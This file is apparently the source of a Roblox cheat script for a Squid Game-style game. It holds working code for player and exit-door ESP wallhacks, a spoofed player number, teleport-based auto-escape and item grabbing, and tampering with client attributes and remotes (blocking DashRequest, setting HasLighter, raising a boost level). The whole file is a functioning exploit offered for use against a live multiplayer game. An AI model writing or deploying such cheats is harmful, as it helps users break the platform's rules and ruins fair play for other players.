MainModule.SetCustomPlayerTag = function(tagNumber)
    local num = tonumber(tagNumber)
    if num and (0 <= num and num <= 999) then
        local formattedNum = string.format("%03d", num)
        local liveFolder = workspace:FindFirstChild("Live")
        if liveFolder then
            local playerFolder = liveFolder:FindFirstChild(LocalPlayer.Name)
            if playerFolder then
                local playerTags = playerFolder:FindFirstChild("PlayerTags")
                if playerTags then
                    local backTag = playerTags:FindFirstChild("Back")
                    local frontTag = playerTags:FindFirstChild("Front")
                    
                    local backLabel = nil
                    local frontLabel = nil
                    
                    if backTag then
                        local backSurface = backTag:FindFirstChild("SurfaceGui")
                        if backSurface then
                            backLabel = backSurface:FindFirstChild("TextLabel")
                        end
                    end
                    
                    if frontTag then
                        local frontSurface = frontTag:FindFirstChild("SurfaceGui")
                        if frontSurface then
                            frontLabel = frontSurface:FindFirstChild("TextLabel")
                        end
                    end
                    
                    if backLabel and frontLabel then
                        backLabel.Text = formattedNum
                        frontLabel.Text = formattedNum
                    end
                end
            end
        end
    end
    PlayBell()
end

MainModule.CustomPlayerTagEnabled = false
MainModule.CustomPlayerTagValue = "067"
MainModule.CustomPlayerTagConnection = nil

local function FormatTagValue(value)
    local num = tonumber(value)
    if num and num >= 0 and num <= 999 then
        return string.format("%03d", num)
    end
    return "000"
end

MainModule.ToggleCustomPlayerTag = function(enabled)
    MainModule.CustomPlayerTagEnabled = enabled
    
    if MainModule.CustomPlayerTagConnection then
        MainModule.CustomPlayerTagConnection:Disconnect()
        MainModule.CustomPlayerTagConnection = nil
    end
    
    if enabled then
        MainModule.SetCustomPlayerTag(MainModule.CustomPlayerTagValue)
        
        MainModule.CustomPlayerTagConnection = RunService.Heartbeat:Connect(function()
            if MainModule.CustomPlayerTagEnabled then
                local liveFolder = workspace:FindFirstChild("Live")
                if liveFolder then
                    local playerFolder = liveFolder:FindFirstChild(LocalPlayer.Name)
                    if playerFolder then
                        local playerTags = playerFolder:FindFirstChild("PlayerTags")
                        if playerTags then
                            local backTag = playerTags:FindFirstChild("Back")
                            local frontTag = playerTags:FindFirstChild("Front")
                            
                            local backLabel = nil
                            local frontLabel = nil
                            
                            if backTag then
                                local backSurface = backTag:FindFirstChild("SurfaceGui")
                                if backSurface then
                                    backLabel = backSurface:FindFirstChild("TextLabel")
                                end
                            end
                            
                            if frontTag then
                                local frontSurface = frontTag:FindFirstChild("SurfaceGui")
                                if frontSurface then
                                    frontLabel = frontSurface:FindFirstChild("TextLabel")
                                end
                            end
                            
                            if backLabel and frontLabel then
                                local formattedValue = FormatTagValue(MainModule.CustomPlayerTagValue)
                                if backLabel.Text ~= formattedValue then
                                    backLabel.Text = formattedValue
                                end
                                if frontLabel.Text ~= formattedValue then
                                    frontLabel.Text = formattedValue
                                end
                            end
                        end
                    end
                end
            end
        end)
    else
        MainModule.SetCustomPlayerTag(0)
    end
    PlayToggleSound()
end

MainModule.SetCustomTagValue = function(value)
    local formatted = FormatTagValue(value)
    MainModule.CustomPlayerTagValue = formatted
    if MainModule.CustomPlayerTagEnabled then
        MainModule.SetCustomPlayerTag(tonumber(formatted))
    end
end

MainModule.AutoNextEnabled = false
MainModule.AutoNextConn = nil
MainModule.TargetPos = Vector3.new(-214.30,186.86,242.64)
MainModule.Radius = 80

MainModule.ToggleAutoNextGame = function(enabled)
    MainModule.AutoNextEnabled = enabled
    if MainModule.AutoNextConn then MainModule.AutoNextConn:Disconnect(); MainModule.AutoNextConn = nil end
    if enabled then
        local t = 0
        MainModule.AutoNextConn = RunService.Heartbeat:Connect(function(dt)
            if not MainModule.AutoNextEnabled then return end
            local c = LocalPlayer.Character
            local pp = c and c.PrimaryPart and c.PrimaryPart.Position
            if pp and (pp - MainModule.TargetPos).Magnitude <= MainModule.Radius then
                t = t + dt
                if t >= 3.4 then t = 0; pcall(function() game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TemporaryReachedBindable"):FireServer() end) end
            else t = 0 end
        end)
    else
    end
    PlayToggleSound()
end

local FreeDashEnabled = false
local blockedRemotes = {"DashRequest"}

function ToggleFreeDash(enabled)
    FreeDashEnabled = enabled
    
    if enabled then
        local b = LocalPlayer:FindFirstChild("Boosts")
        local fasterSprint = b and b:FindFirstChild("Faster Sprint")
        
        if not fasterSprint then
            MainModule.Notify("Free Dash", "You don't have Faster Sprint boost!", 0.9)
            PlayErrorSound()
            return false
        end
        
        local currentLevel = fasterSprint.Value
        if currentLevel ~= 5 then
            MainModule.Notify("Free Dash", "Your Faster Sprint level is " .. currentLevel .. ", need level 5!", 0.9)
            PlayErrorSound()
            return false
        end
        
        pcall(function()
            local r = ReplicatedStorage:FindFirstChild("Remotes")
            if r and setrawmetatable then
                for _, remoteName in ipairs(blockedRemotes) do
                    local remote = r:FindFirstChild(remoteName)
                    if remote then
                        setrawmetatable(remote, {__index = function() return function() end end})
                    end
                end
            end
            
            if b and fasterSprint then 
                fasterSprint.Value = 6 
            end
        end)
        PlayToggleSound()
        return true
    else
        pcall(function()
            local b = LocalPlayer:FindFirstChild("Boosts")
            if b and b:FindFirstChild("Faster Sprint") then 
                local currentValue = b["Faster Sprint"].Value
                if currentValue == 6 then
                    b["Faster Sprint"].Value = 5
                end
            end
        end)
        PlayToggleSound()
        return true
    end
end

MainModule.AmbienceEnabled = false
MainModule.motionBlur = nil
MainModule.blurAmount = 12
MainModule.blurAmplifier = 12
MainModule.lastVector = nil
MainModule.originalTimeOfDay = nil
MainModule.ambienceConnection = nil
MainModule.timeFixConnection = nil

MainModule.ToggleAmbience = function(enabled)
    MainModule.AmbienceEnabled = enabled
    
    if enabled then
        local camera = workspace.CurrentCamera
        MainModule.lastVector = camera.CFrame.LookVector
        
        if MainModule.motionBlur and MainModule.motionBlur.Parent then
            MainModule.motionBlur:Destroy()
        end
        
        MainModule.motionBlur = Instance.new("BlurEffect", camera)
        
        local Lighting = game:GetService("Lighting")
        MainModule.originalTimeOfDay = Lighting.TimeOfDay
        
        Lighting.TimeOfDay = "22:00:00"
        
        if MainModule.timeFixConnection then
            MainModule.timeFixConnection:Disconnect()
        end
        
        MainModule.timeFixConnection = Lighting.Changed:Connect(function(property)
            if property == "TimeOfDay" and MainModule.AmbienceEnabled then
                Lighting.TimeOfDay = "22:00:00"
            end
        end)
        
        if MainModule.ambienceConnection then
            MainModule.ambienceConnection:Disconnect()
        end
        
        MainModule.ambienceConnection = RunService.Heartbeat:Connect(function()
            if not MainModule.AmbienceEnabled then return end
            
            local camera = workspace.CurrentCamera
            if not camera then return end
            
            if not MainModule.motionBlur or MainModule.motionBlur.Parent == nil then
                MainModule.motionBlur = Instance.new("BlurEffect", camera)
            end
            
            local currentVector = camera.CFrame.LookVector
            local magnitude = (currentVector - MainModule.lastVector).magnitude
            MainModule.motionBlur.Size = math.abs(magnitude) * MainModule.blurAmount * MainModule.blurAmplifier / 2
            MainModule.lastVector = currentVector
        end)
        
        workspace.Changed:Connect(function(property)
            if property == "CurrentCamera" and MainModule.AmbienceEnabled then
                local camera = workspace.CurrentCamera
                if MainModule.motionBlur and MainModule.motionBlur.Parent then
                    MainModule.motionBlur.Parent = camera
                else
                    MainModule.motionBlur = Instance.new("BlurEffect", camera)
                end
            end
        end)
        
    else
        if MainModule.motionBlur then
            MainModule.motionBlur:Destroy()
            MainModule.motionBlur = nil
        end
        
        if MainModule.ambienceConnection then
            MainModule.ambienceConnection:Disconnect()
            MainModule.ambienceConnection = nil
        end
        
        if MainModule.timeFixConnection then
            MainModule.timeFixConnection:Disconnect()
            MainModule.timeFixConnection = nil
        end
        
        local Lighting = game:GetService("Lighting")
        if MainModule.originalTimeOfDay then
            Lighting.TimeOfDay = MainModule.originalTimeOfDay
        end
        
    end
    
    PlayToggleSound()
end

MainModule.ExitDoorESPEnabled = false
MainModule.ExitDoorESPThread = nil
MainModule.ExitDoorESPObjects = {}

function MainModule.ToggleExitDoorESP(enabled)
    MainModule.ExitDoorESPEnabled = enabled
    
    if enabled then
        if MainModule.ExitDoorESPThread then
            task.cancel(MainModule.ExitDoorESPThread)
        end
        
        MainModule.ExitDoorESPThread = task.spawn(function()
            local espDoors = {}
            
            local function createDoorESP(model)
                local cf, size = model:GetBoundingBox()
                
                local box = Instance.new("BoxHandleAdornment")
                box.Adornee = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
                if not box.Adornee then return nil end
                box.Size = size
                box.Color3 = Color3.fromRGB(255, 255, 0)
                box.Transparency = 0.5
                box.AlwaysOnTop = true
                box.ZIndex = 10
                box.Parent = box.Adornee
                
                local billboard = Instance.new("BillboardGui")
                billboard.Adornee = box.Adornee
                billboard.Size = UDim2.new(0, 100, 0, 50)
                billboard.StudsOffset = Vector3.new(0, 3, 0)
                billboard.AlwaysOnTop = true
                billboard.Parent = box.Adornee
                
                local textLabel = Instance.new("TextLabel")
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.Text = "EXIT DOOR"
                textLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
                textLabel.TextScaled = true
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.Parent = billboard
                
                return {box = box, billboard = billboard, part = box.Adornee}
            end
            
            while MainModule.ExitDoorESPEnabled do
                for _, obj in pairs(espDoors) do
                    if obj.box and (not obj.part or not obj.part.Parent) then
                        pcall(function() obj.box:Destroy() end)
                        pcall(function() obj.billboard:Destroy() end)
                    end
                end
                
                local hideMap = workspace:FindFirstChild("HideAndSeekMap")
                if hideMap then
                    local function findDoors(parent)
                        for _, child in pairs(parent:GetChildren()) do
                            if child.Name == "EXITDOOR" and child:GetAttribute("ActuallyWorks") == true then
                                if not espDoors[child] then
                                    local esp = createDoorESP(child)
                                    if esp then
                                        espDoors[child] = esp
                                    end
                                end
                            end
                            findDoors(child)
                        end
                    end
                    findDoors(hideMap)
                end
                
                task.wait(0.5)
            end
        end)
    else
        if MainModule.ExitDoorESPThread then
            task.cancel(MainModule.ExitDoorESPThread)
            MainModule.ExitDoorESPThread = nil
        end
    end
    PlayToggleSound()
end

MainModule.Misc = {
    ESPEnabled = false,
    ESPPlayers = true,
    ESPHiders = true,
    ESPSeekers = true,
    ESPNames = true,
    ESPDistance = true,
    ESPHighlight = true,
    ESPFillTransparency = 0.75,
    ESPOutlineTransparency = 0.2,
    ESPTextSize = 14
}

MainModule.ESP = {
    Players = {},
    Objects = {},
    Connections = {},
    Folder = nil,
    MainConnection = nil,
    UpdateRate = 0.1
}

function MainModule.ClearPlayerESP(player)
    if not player then return end
    local espData = MainModule.ESP.Players[player]
    if espData then
        if espData.Highlight then
            espData.Highlight.Adornee = nil
            pcall(function() espData.Highlight:Destroy() end)
        end
        if espData.Billboard then
            pcall(function() espData.Billboard:Destroy() end)
        end
        if espData.CharAddedConn then
            pcall(function() espData.CharAddedConn:Disconnect() end)
            espData.CharAddedConn = nil
        end
        if espData.DiedConn then
            pcall(function() espData.DiedConn:Disconnect() end)
            espData.DiedConn = nil
        end
        MainModule.ESP.Players[player] = nil
    end
end

function MainModule.UpdatePlayerESP(player)
    if not player or player == LocalPlayer or not MainModule.Misc.ESPEnabled then return end
    
    local character = player.Character
    if not character then 
        MainModule.ClearPlayerESP(player)
        return 
    end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    
    if humanoid and rootPart and humanoid.Health > 0 then
        local espData = MainModule.ESP.Players[player]
        
        if not espData then
            espData = {
                Player = player,
                Highlight = nil,
                Billboard = nil,
                Label = nil,
                CharAddedConn = nil,
                DiedConn = nil
            }
            MainModule.ESP.Players[player] = espData
            
            espData.DiedConn = humanoid.Died:Connect(function()
                if espData.Highlight then
                    espData.Highlight.Adornee = nil
                    espData.Highlight.Enabled = false
                end
                if espData.Billboard then
                    espData.Billboard.Enabled = false
                end
            end)
        end
        
        if not espData.Highlight then
            espData.Highlight = Instance.new("Highlight")
            espData.Highlight.Name = player.Name .. "_ESP"
            espData.Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            espData.Highlight.Enabled = true
            espData.Highlight.Parent = MainModule.ESP.Folder or CoreGui
        end
        
        if espData.Highlight.Adornee ~= character then
            espData.Highlight.Adornee = character
        end
        
        local color = Color3.fromRGB(0, 120, 255)
        if MainModule.IsHider and MainModule.IsHider(player) then
            color = Color3.fromRGB(0, 255, 0)
        elseif MainModule.IsSeeker and MainModule.IsSeeker(player) then
            color = Color3.fromRGB(255, 0, 0)
        end
        
        espData.Highlight.FillColor = color
        espData.Highlight.OutlineColor = color
        espData.Highlight.FillTransparency = MainModule.Misc.ESPFillTransparency
        espData.Highlight.OutlineTransparency = MainModule.Misc.ESPOutlineTransparency
        espData.Highlight.Enabled = true
        
        if MainModule.Misc.ESPNames then
            if not espData.Billboard then
                espData.Billboard = Instance.new("BillboardGui")
                espData.Billboard.Name = player.Name .. "_Text"
                espData.Billboard.AlwaysOnTop = true
                espData.Billboard.Size = UDim2.new(0, 200, 0, 50)
                espData.Billboard.StudsOffset = Vector3.new(0, 2.5, 0)
                espData.Billboard.Parent = MainModule.ESP.Folder or CoreGui
                
                espData.Label = Instance.new("TextLabel")
                espData.Label.Size = UDim2.new(1, 0, 1, 0)
                espData.Label.BackgroundTransparency = 1
                espData.Label.TextColor3 = color
                espData.Label.TextSize = 14
                espData.Label.Font = Enum.Font.GothamBold
                espData.Label.TextStrokeColor3 = Color3.new(0, 0, 0)
                espData.Label.TextStrokeTransparency = 0.5
                espData.Label.Parent = espData.Billboard
            end
            
            if espData.Billboard.Adornee ~= rootPart then
                espData.Billboard.Adornee = rootPart
            end
            
            espData.Billboard.Enabled = true
            local healthText = string.format("HP: %d/%d", math.floor(humanoid.Health), math.floor(humanoid.MaxHealth))
            local nameText = player.DisplayName or player.Name
            espData.Label.Text = nameText .. "\n" .. healthText
            espData.Label.TextColor3 = color
        elseif espData.Billboard then
            espData.Billboard.Enabled = false
        end
    else
        local espData = MainModule.ESP.Players[player]
        if espData then
            if espData.Highlight then
                espData.Highlight.Enabled = false
                espData.Highlight.Adornee = nil
            end
            if espData.Billboard then
                espData.Billboard.Enabled = false
                espData.Billboard.Adornee = nil
            end
        end
    end
end

function MainModule.SetupPlayerESP(player)
    if player == LocalPlayer then return end
    
    MainModule.ClearPlayerESP(player)
    
    if player.Character then
        MainModule.UpdatePlayerESP(player)
    end
    
    local charAddedConn = player.CharacterAdded:Connect(function(character)
        task.wait(0.05)
        MainModule.UpdatePlayerESP(player)
    end)
    
    local espData = MainModule.ESP.Players[player]
    if espData then
        espData.CharAddedConn = charAddedConn
    end
end

function MainModule.ToggleOldESP(enabled)
    MainModule.Misc.ESPEnabled = enabled
    
    if MainModule.ESP.MainConnection then
        MainModule.ESP.MainConnection:Disconnect()
        MainModule.ESP.MainConnection = nil
    end
    
    MainModule.ClearESP()
    
    if enabled then
        MainModule.ESP.Folder = Instance.new("Folder")
        MainModule.ESP.Folder.Name = "HollyScriptX_ESP"
        MainModule.ESP.Folder.Parent = CoreGui
        
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                MainModule.SetupPlayerESP(player)
            end
        end
        
        MainModule.ESP.Connections.PlayerAdded = Players.PlayerAdded:Connect(function(player)
            if MainModule.Misc.ESPEnabled then
                MainModule.SetupPlayerESP(player)
            end
        end)
        
        MainModule.ESP.Connections.PlayerRemoving = Players.PlayerRemoving:Connect(function(player)
            MainModule.ClearPlayerESP(player)
        end)

        MainModule.ESP.MainConnection = RunService.Heartbeat:Connect(function()
            if not MainModule.Misc.ESPEnabled then return end
            for player, espData in pairs(MainModule.ESP.Players) do
                if player and player.Parent then
                    MainModule.UpdatePlayerESP(player)
                else
                    MainModule.ClearPlayerESP(player)
                end
            end
        end)
    end
    PlayToggleSound()
end

function MainModule.ClearESP()
    for player, _ in pairs(MainModule.ESP.Players) do
        MainModule.ClearPlayerESP(player)
    end
    MainModule.ESP.Players = {}
    
    if MainModule.ESP.Connections then
        for name, connection in pairs(MainModule.ESP.Connections) do
            if connection then
                pcall(function() connection:Disconnect() end)
                MainModule.ESP.Connections[name] = nil
            end
        end
    end
    
    if MainModule.ESP.Folder then
        pcall(function() MainModule.ESP.Folder:Destroy() end)
        MainModule.ESP.Folder = nil
    end
end

local NewESP = {
    Enabled = false,
    Cache = {},
    ScreenGui = nil,
    Connection = nil
}

NewESP.ScreenGui = Instance.new("ScreenGui")
NewESP.ScreenGui.Name = "NewESP"
NewESP.ScreenGui.ResetOnSpawn = false
NewESP.ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
NewESP.ScreenGui.Parent = CoreGui

function NewESP.HideAll()
    for _, esp in pairs(NewESP.Cache) do
        if esp then
            pcall(function()
                if esp.Box then esp.Box.Visible = false end
                if esp.Name then esp.Name.Visible = false end
                if esp.Role then esp.Role.Visible = false end
                if esp.HealthBg then esp.HealthBg.Visible = false end
                if esp.HealthBar then esp.HealthBar.Visible = false end
            end)
        end
    end
end

function NewESP.ClearAll()
    for _, esp in pairs(NewESP.Cache) do
        pcall(function()
            if esp.Box then esp.Box:Destroy() end
            if esp.Name then esp.Name:Destroy() end
            if esp.Role then esp.Role:Destroy() end
            if esp.HealthBg then esp.HealthBg:Destroy() end
            if esp.HealthBar then esp.HealthBar:Destroy() end
        end)
    end
    NewESP.Cache = {}
end

function NewESP.Create(root)
    if NewESP.Cache[root] then return end
    local esp = {}
    
    local box = Instance.new("Frame")
    box.BackgroundTransparency = 1
    box.BorderSizePixel = 0
    box.Visible = false
    box.Parent = NewESP.ScreenGui
    local boxStroke = Instance.new("UIStroke")
    boxStroke.Thickness = 1.5
    boxStroke.Parent = box
    esp.Box = box
    esp.BoxStroke = boxStroke
    
    local name = Instance.new("TextLabel")
    name.BackgroundTransparency = 1
    name.Font = Enum.Font.GothamBold
    name.TextSize = 14
    name.TextColor3 = Color3.new(1, 1, 1)
    name.TextStrokeTransparency = 0
    name.TextStrokeColor3 = Color3.new(0, 0, 0)
    name.Size = UDim2.new(0, 300, 0, 20)
    name.TextXAlignment = Enum.TextXAlignment.Center
    name.Visible = false
    name.Parent = NewESP.ScreenGui
    esp.Name = name
    
    local role = Instance.new("TextLabel")
    role.BackgroundTransparency = 1
    role.Font = Enum.Font.GothamBold
    role.TextSize = 12
    role.TextColor3 = Color3.fromRGB(255, 255, 255)
    role.TextStrokeTransparency = 0
    role.TextStrokeColor3 = Color3.new(0, 0, 0)
    role.Size = UDim2.new(0, 300, 0, 18)
    role.TextXAlignment = Enum.TextXAlignment.Center
    role.Visible = false
    role.Parent = NewESP.ScreenGui
    esp.Role = role
    
    local healthBg = Instance.new("Frame")
    healthBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    healthBg.BorderSizePixel = 0
    healthBg.Visible = false
    healthBg.Parent = NewESP.ScreenGui
    esp.HealthBg = healthBg
    
    local healthBar = Instance.new("Frame")
    healthBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    healthBar.BorderSizePixel = 0
    healthBar.Visible = false
    healthBar.Parent = NewESP.ScreenGui
    esp.HealthBar = healthBar
    
    NewESP.Cache[root] = esp
end

function NewESP.Update()
    if not NewESP.Enabled then
        NewESP.HideAll()
        return
    end
    
    local cam = workspace.CurrentCamera
    if not cam then return end
    if not LocalPlayer then return end
    
    local screenSize = cam.ViewportSize
    local myChar = LocalPlayer.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    
    local targets = {}
    local players = Players:GetPlayers()
    
    for _, plr in pairs(players) do
        if plr ~= LocalPlayer then
            local char = plr.Character
            if char then
                local root = char:FindFirstChild("HumanoidRootPart")
                local hum = char:FindFirstChild("Humanoid")
                if root and hum and hum.Health and hum.Health > 0 then
                    if root.Position.Y > -50 then
                        targets[root] = {char = char, hum = hum, plr = plr}
                    end
                end
            end
        end
    end
    
    for root, esp in pairs(NewESP.Cache) do
        if not targets[root] then
            pcall(function()
                if esp.Box then esp.Box:Destroy() end
                if esp.Name then esp.Name:Destroy() end
                if esp.Role then esp.Role:Destroy() end
                if esp.HealthBg then esp.HealthBg:Destroy() end
                if esp.HealthBar then esp.HealthBar:Destroy() end
            end)
            NewESP.Cache[root] = nil
        end
    end
    
    for root, data in pairs(targets) do
        if not NewESP.Cache[root] then
            NewESP.Create(root)
        end
        
        local esp = NewESP.Cache[root]
        local char = data.char
        local hum = data.hum
        local plr = data.plr
        
        local head = char:FindFirstChild("Head")
        local headPos = head and head.Position or (root.Position + Vector3.new(0, 2, 0))
        local feetPos = root.Position - Vector3.new(0, 3, 0)
        
        local topPos = headPos + Vector3.new(0, 2, 0)
        local bottomPos = feetPos - Vector3.new(0, 1.5, 0)
        
        local rs, ron = cam:WorldToViewportPoint(root.Position)
        local hs = cam:WorldToViewportPoint(topPos)
        local fs = cam:WorldToViewportPoint(bottomPos)
        
        if ron and rs.Z > 0 then
            local boxTop = math.min(hs.Y, fs.Y)
            local boxBottom = math.max(hs.Y, fs.Y)
            local boxHeight = math.abs(boxBottom - boxTop)
            local boxWidth = boxHeight * 0.6
            local cx = rs.X
            
            if boxHeight < 5 then
                boxHeight = 30
                boxWidth = 20
                boxTop = fs.Y - boxHeight
            end
            
            local roleText = "Player"
            if plr:GetAttribute("IsHider") == true then roleText = "Hider"
            elseif plr:GetAttribute("IsHunter") == true then roleText = "Seeker" end
            
            local color = Color3.fromRGB(255, 255, 255)
            if roleText == "Hider" then color = Color3.fromRGB(0, 150, 255)
            elseif roleText == "Seeker" then color = Color3.fromRGB(255, 50, 50) end
            
            esp.Box.Position = UDim2.new(0, cx - boxWidth/2, 0, boxTop)
            esp.Box.Size = UDim2.new(0, boxWidth, 0, boxHeight)
            esp.BoxStroke.Color = color
            esp.Box.Visible = true
            
            esp.Name.Text = plr.DisplayName or plr.Name
            esp.Name.Position = UDim2.new(0, cx - 150, 0, boxTop - 25)
            esp.Name.TextColor3 = color
            esp.Name.Visible = true
            
            esp.Role.Text = "[" .. roleText .. "]"
            esp.Role.Position = UDim2.new(0, cx - 150, 0, boxTop - 45)
            esp.Role.TextColor3 = color
            esp.Role.Visible = true
            
            local hpPercent = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
            local barX = cx - boxWidth/2 - 6
            
            esp.HealthBg.Position = UDim2.new(0, barX - 1, 0, boxTop - 1)
            esp.HealthBg.Size = UDim2.new(0, 5, 0, boxHeight + 2)
            esp.HealthBg.Visible = true
            
            local hh = boxHeight * hpPercent
            esp.HealthBar.Position = UDim2.new(0, barX, 0, boxBottom - hh)
            esp.HealthBar.Size = UDim2.new(0, 3, 0, hh)
            if hpPercent > 0.6 then
                esp.HealthBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            elseif hpPercent > 0.3 then
                esp.HealthBar.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
            else
                esp.HealthBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            end
            esp.HealthBar.Visible = true
        else
            esp.Box.Visible = false
            esp.Name.Visible = false
            esp.Role.Visible = false
            esp.HealthBg.Visible = false
            esp.HealthBar.Visible = false
        end
    end
end

function MainModule.ToggleNewESP(enabled)
    NewESP.Enabled = enabled
    if enabled then
        if not NewESP.Connection then
            NewESP.Connection = RunService.RenderStepped:Connect(function()
                pcall(NewESP.Update)
            end)
        end
    else
        if NewESP.Connection then
            NewESP.Connection:Disconnect()
            NewESP.Connection = nil
        end
        NewESP.HideAll()
        NewESP.ClearAll()
    end
end

MainModule.ESP_Mode = "New"

function MainModule.SetESPMode(mode)
    MainModule.ESP_Mode = mode
    
    MainModule.ToggleNewESP(false)
    MainModule.ToggleOldESP(false)
    
    if mode == "New" then
        if ToggleRefs.PlayerESP and ToggleRefs.PlayerESP.Value then
            MainModule.ToggleNewESP(true)
        end
    elseif mode == "Old" then
        if ToggleRefs.PlayerESP and ToggleRefs.PlayerESP.Value then
            MainModule.ToggleOldESP(true)
        end
    end
    PlayToggleSound()
end

function MainModule.TogglePlayerESP(enabled)
    if enabled then
        if MainModule.ESP_Mode == "New" then
            MainModule.ToggleNewESP(true)
        else
            MainModule.ToggleOldESP(true)
        end
    else
        MainModule.ToggleNewESP(false)
        MainModule.ToggleOldESP(false)
    end
    PlayToggleSound()
end

MainModule.AutoSafe = {
    Enabled = false,
    Connection = nil,
    HasTeleported = false,
    LowHPChecked = false
}

MainModule.ToggleAutoSafe = function(enabled)
    if MainModule.AutoSafe.Connection then
        MainModule.AutoSafe.Connection:Disconnect()
        MainModule.AutoSafe.Connection = nil
    end
    
    MainModule.AutoSafe.Enabled = enabled
    MainModule.AutoSafe.HasTeleported = false
    MainModule.AutoSafe.LowHPChecked = false
    
    if enabled then
        MainModule.AutoSafe.Connection = RunService.Heartbeat:Connect(function()
            if not MainModule.AutoSafe.Enabled then 
                if MainModule.AutoSafe.Connection then
                    MainModule.AutoSafe.Connection:Disconnect()
                    MainModule.AutoSafe.Connection = nil
                end
                return 
            end
            
            local noSafeGames = {
                "Mingle",
                "JumpRope", 
                "Pentathlon",
                "GlassBridge",
                "SquidGame",
                "SkySquidGame",
                "RedLightGreenLight",
                "TugOfWar"
            }
            
            local isNoSafeGame = false
            for _, gameName in pairs(noSafeGames) do
                if MainModule.IsGameActive(gameName) then
                    isNoSafeGame = true
                    break
                end
            end
            
            if isNoSafeGame then
                return
            end
            
            local character = MainModule.GetCharacter()
            if character then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    if MainModule.IsGameActive("HideAndSeek") or MainModule.IsGameActive("LightsOut") or MainModule.IsGameActive("LightOut") then
                        if humanoid.Health <= 30 then
                            if not MainModule.AutoSafe.HasTeleported then
                                local rootPart = character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart
                                if rootPart then
                                    local currentPosition = rootPart.Position
                                    local newPosition = Vector3.new(
                                        currentPosition.X,
                                        currentPosition.Y + 150,
                                        currentPosition.Z
                                    )
                                    rootPart.CFrame = CFrame.new(newPosition)
                                    
                                    MainModule.AutoSafe.HasTeleported = true
                                    MainModule.AutoSafe.LowHPChecked = true
                                end
                            end
                        elseif humanoid.Health > 30 and MainModule.AutoSafe.HasTeleported then
                            MainModule.AutoSafe.HasTeleported = false
                        end
                    else
                        if humanoid.Health <= 30 then
                            if not MainModule.AutoSafe.HasTeleported then
                                local rootPart = character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart
                                if rootPart then
                                    local currentPosition = rootPart.Position
                                    local newPosition = Vector3.new(
                                        currentPosition.X,
                                        currentPosition.Y + 100,
                                        currentPosition.Z
                                    )
                                    rootPart.CFrame = CFrame.new(newPosition)
                                    
                                    MainModule.AutoSafe.HasTeleported = true
                                    MainModule.AutoSafe.LowHPChecked = true
                                end
                            end
                        elseif humanoid.Health > 30 and MainModule.AutoSafe.HasTeleported then
                            MainModule.AutoSafe.HasTeleported = false
                        end
                    end
                end
            end
        end)
    else
    end
    PlayToggleSound()
end

MainModule.Dalgona_Lighter = function()
    if MainModule.IsGameActive("Dalgona") then
        LocalPlayer:SetAttribute("HasLighter", true)
    else
        MainModule.Notify("Dalgona","Wait for Dalgona!",0.9)
        PlayErrorSound()
    end
    PlayBell()
end

MainModule.AutoCollectFlashbang = false
MainModule.AutoCollectFlashbangLoop = nil

MainModule.ToggleAutoCollectFlashbang = function(enabled)
    MainModule.AutoCollectFlashbang = enabled
    
    if MainModule.AutoCollectFlashbangLoop then
        task.cancel(MainModule.AutoCollectFlashbangLoop)
        MainModule.AutoCollectFlashbangLoop = nil
    end
    
    if enabled then
        MainModule.AutoCollectFlashbangLoop = task.spawn(function()
            while MainModule.AutoCollectFlashbang do
                local character = MainModule.GetCharacter()
                if not character then task.wait(0.5) continue end
                local rootPart = MainModule.GetRootPart(character)
                if not rootPart then task.wait(0.5) continue end
                
                local startCF = rootPart.CFrame
                
                if not MainModule.HasTool("Flashbang") then
                    local found = false
                    local effects = workspace:FindFirstChild("Effects")
                    if effects then
                        for _, effect in pairs(effects:GetChildren()) do
                            if effect.Name == "DroppedFlashbang" and effect:FindFirstChild("Stun Grenade") then
                                rootPart.CFrame = effect["Stun Grenade"].CFrame
                                found = true
                                break
                            end
                        end
                    end
                    if found then
                        task.wait(0.3)
                        rootPart.CFrame = startCF
                    end
                end
                task.wait(0.5)
            end
        end)
    else
    end
    PlayToggleSound()
end

MainModule.AutoCollectGrenade = false
MainModule.AutoCollectGrenadeLoop = nil

MainModule.ToggleAutoCollectGrenade = function(enabled)
    MainModule.AutoCollectGrenade = enabled
    
    if MainModule.AutoCollectGrenadeLoop then
        task.cancel(MainModule.AutoCollectGrenadeLoop)
        MainModule.AutoCollectGrenadeLoop = nil
    end
    
    if enabled then
        MainModule.AutoCollectGrenadeLoop = task.spawn(function()
            while MainModule.AutoCollectGrenade do
                local character = MainModule.GetCharacter()
                if not character then task.wait(0.5) continue end
                local rootPart = MainModule.GetRootPart(character)
                if not rootPart then task.wait(0.5) continue end
                
                local startCF = rootPart.CFrame
                
                if not MainModule.HasTool("Grenade") then
                    local found = false
                    local effects = workspace:FindFirstChild("Effects")
                    if effects then
                        for _, effect in pairs(effects:GetChildren()) do
                            if effect.Name == "DroppedGrenade" and effect:FindFirstChild("Handle") then
                                rootPart.CFrame = effect.Handle.CFrame
                                found = true
                                break
                            end
                        end
                    end
                    if found then
                        task.wait(0.3)
                        rootPart.CFrame = startCF
                    end
                end
                task.wait(0.5)
            end
        end)
    else
    end
    PlayToggleSound()
end

MainModule.JR_TP_Start = function()
    if MainModule.IsGameActive("JumpRope") then
        MainModule.SafeTeleport(Vector3.new(615.284424,192.274277,920.952515))
        MainModule.Notify("JumpRope","Teleported to Start",0.9)
    else
        MainModule.Notify("JumpRope","Wait for JumpRope!",0.9)
        PlayErrorSound()
    end
    PlayBell()
end

